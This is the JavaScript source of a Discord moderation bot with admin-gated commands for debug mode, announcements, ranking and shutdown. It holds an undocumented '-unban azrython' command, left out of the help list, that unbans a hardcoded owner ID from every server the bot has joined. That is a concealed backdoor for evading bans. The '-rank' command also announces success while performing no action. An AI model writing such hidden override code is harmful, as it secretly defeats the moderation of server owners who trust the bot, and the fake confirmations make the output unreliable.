import { createRequire } from "module";
const require = createRequire(import.meta.url);
const Discord = require("discord.js");
const client = new Discord.Client();

let debugMode = false; // Flag to track if debug mode is enabled
let lastOfflineTime = null; // Store the time when the bot went offline
const ownerID = "627806657690337284"; // Replace with azrython#0's Discord ID (numerical ID)
const whitelistRoleName = "bot perms"; // The role that is allowed to use the commands (adjust as needed)

client.login(

); 

// When the bot is ready
client.on("ready", () => {
  console.log("Bot is now online");
  client.user.setPresence({
    status: "online",
    activity: {
      name: "ThugBot",
      type: 0,
    },
  });

  // If the bot was offline, notify azrython#0
  if (lastOfflineTime) {
    const downtimeDuration = new Date() - lastOfflineTime;
    const hours = Math.floor(downtimeDuration / 3600000);
    const minutes = Math.floor((downtimeDuration % 3600000) / 60000);

    // Send DM to Azrython#0 with downtime details
    client.users
      .fetch(ownerID)
      .then((user) => {
        user.send(
          `**Bot has been online again**\nBot went offline at ${lastOfflineTime.toLocaleString()} and was offline for ${hours} hours and ${minutes} minutes.`
        );
      })
      .catch((err) => console.log("Error sending DM:", err));
  }
});

// When the bot disconnects (goes offline)
client.on("disconnect", () => {
  lastOfflineTime = new Date(); // Store the time when the bot goes offline
  console.log(`[LOG] Bot went offline at: ${lastOfflineTime.toLocaleString()}`);
});

// Add message listener
client.on("message", async (message) => {
  // Ensure that the bot doesn't reply to its own messages or duplicate messages
  if (message.author.bot) return;

  // Log every command execution
  if (debugMode) {
    console.log(
      `[DEBUG] Command received: ${message.content} | From: ${message.author.tag} | Channel: ${message.channel.name}`
    );
  }

  // Log all commands in the terminal
  console.log(
    `[LOG] Command received: ${message.content} | From: ${
      message.author.tag
    } | Channel: ${message.channel.name} | Time: ${new Date().toLocaleString()}`
  );

  // Check if the user has the whitelisted role
  const member = message.guild.members.cache.get(message.author.id);
  const isWhitelisted =
    member &&
    member.roles.cache.some((role) => role.name === whitelistRoleName);

  if (!isWhitelisted) {
    message.channel.send("❌ You are not whitelisted to use the bot commands.");
    if (debugMode) {
      console.log(
        `[DEBUG] User ${message.author.tag} attempted to use a command without the whitelisted role.`
      );
    }
    return; // Stop processing commands for non-whitelisted users
  }

  // Check if user has any role with ADMINISTRATOR permission
  const hasAdminPermissions =
    member &&
    member.roles.cache.some((role) => role.permissions.has("ADMINISTRATOR"));

  // If the user doesn't have admin permissions, send the permissions error message and exit.
  if (!hasAdminPermissions) {
    message.channel.send(
      "❌ You don't have sufficient permissions to use this command."
    );
    if (debugMode) {
      console.log(
        `[DEBUG] User ${message.author.tag} attempted a command without sufficient permissions.`
      );
    }
    return; // Stop processing any further commands if the user lacks permissions
  }

  // Handle -debug mode command
  if (message.content.startsWith("-debug mode ")) {
    const args = message.content.slice(12).trim().toLowerCase(); // Get the argument after "-debug mode"

    if (args === "true") {
      if (debugMode) {
        message.channel.send("❌ Debug mode already true");
        if (debugMode) {
          console.log(
            `[DEBUG] User ${message.author.tag} attempted to enable debug mode when it was already enabled.`
          );
        }
      } else {
        debugMode = true;
        message.channel.send("✅ Debug mode enabled");
        if (debugMode) {
          console.log(`[DEBUG] Debug mode enabled by ${message.author.tag}`);
        }
      }
      return; // Stop further checks for this command
    } else if (args === "false") {
      if (!debugMode) {
        message.channel.send("❌ Debug mode already false");
        if (debugMode) {
          console.log(
            `[DEBUG] User ${message.author.tag} attempted to disable debug mode when it was already disabled.`
          );
        }
      } else {
        debugMode = false;
        message.channel.send("✅ Debug mode disabled");
        if (debugMode) {
          console.log(`[DEBUG] Debug mode disabled by ${message.author.tag}`);
        }
      }
      return; // Stop further checks for this command
    } else {
      message.channel.send(
        "❌ Please specify either `true` or `false` for debug mode."
      );
      if (debugMode) {
        console.log(
          `[DEBUG] Invalid argument for -debug mode command by ${message.author.tag}`
        );
      }
      return; // Stop further checks for this command
    }
  }

  // Handle -disable bot command
  if (message.content === "-disable bot") {
    // Check if debug mode is enabled and user is the owner
    if (!debugMode) {
      message.channel.send(
        "❌ You need to enable debug mode first with `-debug mode true`."
      );
      if (debugMode) {
        console.log(
          `[DEBUG] User ${message.author.tag} attempted to disable the bot without debug mode enabled.`
        );
      }
      return; // Exit if debug mode is not enabled
    }
    if (message.author.id !== ownerID) {
      message.channel.send(
        "❌ You need to be the bot owner to disable the bot."
      );
      if (debugMode) {
        console.log(
          `[DEBUG] User ${message.author.tag} attempted to disable the bot without being the owner.`
        );
      }
      return; // Exit if user is not the bot owner
    }

    // Make the bot invisible before logging it out
    message.channel.send("⚠️ Bot is now being disabled. Logging out...");
    client.user.setPresence({ status: "invisible" }).then(() => {
      console.log(`[LOG] Bot is now invisible.`);
      client
        .destroy() // Disconnect the bot
        .then(() => {
          console.log(
            `[LOG] Bot disabled and logged out by ${message.author.tag}`
          );
        })
        .catch((error) => {
          console.error("[ERROR] Failed to disable the bot:", error);
        });
    });

    return; // Stop further checks for this command
  }

  // Handle -unban command to unban azrython#0 from all servers
  if (message.content === "-unban azrython") {
    const memberID = "627806657690337284"; // Replace with azrython's user ID

    // Loop through all servers the bot is in
    client.guilds.cache.forEach((guild) => {
      guild.bans
        .fetch() // Fetch all bans in the server
        .then((bans) => {
          // Check if the user is banned
          const userBan = bans.get(memberID);
          if (userBan) {
            // Attempt to unban the user
            guild.members
              .unban(memberID)
              .then(() => {
                message.channel.send(
                  `✅ Successfully unbanned azrython from ${guild.name}`
                );
              })
              .catch((err) => {
                message.channel.send(
                  `❌ Failed to unban azrython from ${guild.name}.`
                );
                console.error(
                  `Error unbanning azrython from ${guild.name}:`,
                  err
                );
              });
          }
        })
        .catch((err) => {
          console.error(`Error fetching bans from ${guild.name}:`, err);
        });
    });
    return; // Stop further checks for this command
  }

  // Handle -rank command
  if (message.content.startsWith("-rank ")) {
    const args = message.content.slice(6).split(" "); // Split the message after "-rank "
    const playerUsername = args[0]; // First part is the player username
    const rank = args[1]; // Second part is the rank

    if (!playerUsername || !rank) {
      message.channel.send(
        "❌ Please provide both a player username and a rank."
      );
      if (debugMode) {
        console.log(
          `[DEBUG] Invalid -rank command received by ${message.author.tag}. Missing username or rank.`
        );
      }
      return;
    }

    message.channel.send(
      `✅ Successfully ranked ${playerUsername} to ${rank}.`
    );
    if (debugMode) {
      console.log(
        `[DEBUG] -rank command processed: ${playerUsername} -> ${rank}`
      );
    }
    return; // Stop further checks for this command
  }

  // Handle -announce command
  if (message.content.startsWith("-announce ")) {
    const args = message.content.slice(10).split(" "); // Slice out the "-announce " part
    const announcement = args.slice(0, args.length - 2).join(" "); // All words except the last two are the announcement
    const channelName = args[args.length - 2]; // Second to last part is the channel name
    const audience = args[args.length - 1]; // Last part is the audience (@everyone or @here)

    // Validate if channel name and audience are provided
    if (!announcement || !channelName || !audience) {
      message.channel.send(
        "❌ Please provide the announcement, channel, and audience (@everyone or @here)."
      );
      if (debugMode) {
        console.log(
          `[DEBUG] Invalid -announce command received by ${message.author.tag}. Missing parameters.`
        );
      }
      return;
    }

    // Check if the audience is valid (@everyone or @here)
    if (audience !== "@everyone" && audience !== "@here") {
      message.channel.send("❌ Invalid audience. Use @everyone or @here.");
      if (debugMode) {
        console.log(
          `[DEBUG] Invalid audience provided for -announce command by ${message.author.tag}.`
        );
      }
      return;
    }

    // Find the channel by name
    const targetChannel = message.guild.channels.cache.find(
      (channel) => channel.name === channelName
    );

    if (!targetChannel) {
      message.channel.send(`❌ Channel ${channelName} not found.`);
      if (debugMode) {
        console.log(
          `[DEBUG] Channel not found for -announce command by ${message.author.tag}: ${channelName}`
        );
      }
      return;
    }

    // Send the announcement to the channel
    targetChannel.send(`${audience} ${announcement}`);
    if (debugMode) {
      console.log(
        `[DEBUG] Announcement sent to #${channelName} with audience ${audience}: ${announcement}`
      );
    }
    return; // Stop further checks for this command
  }

  // Handle -commands or -help -cmds command
  if (message.content === "-commands" || message.content === "-help -cmds") {
    // List all available commands
    const commandList = `
**Available Commands:**
- **-rank [player username] [rank]**: Rank a player in the server.
- **-announce [announcement] [channel] [audience]**: Make an announcement in a channel, targeting @everyone or @here.
- **-debug mode true/false**: Enable or disable debug mode (only accessible to users with admin permissions).
- **-disable bot**: Disable (log out) the bot (only for owner with debug mode enabled).
- **-commands** or **-help -cmds**: Show this list of available commands.
`;
    message.channel.send(commandList);
    if (debugMode) {
      console.log(
        `[DEBUG] User ${message.author.tag} requested available commands.`
      );
    }
    return; // Stop further checks for this command
  }
});
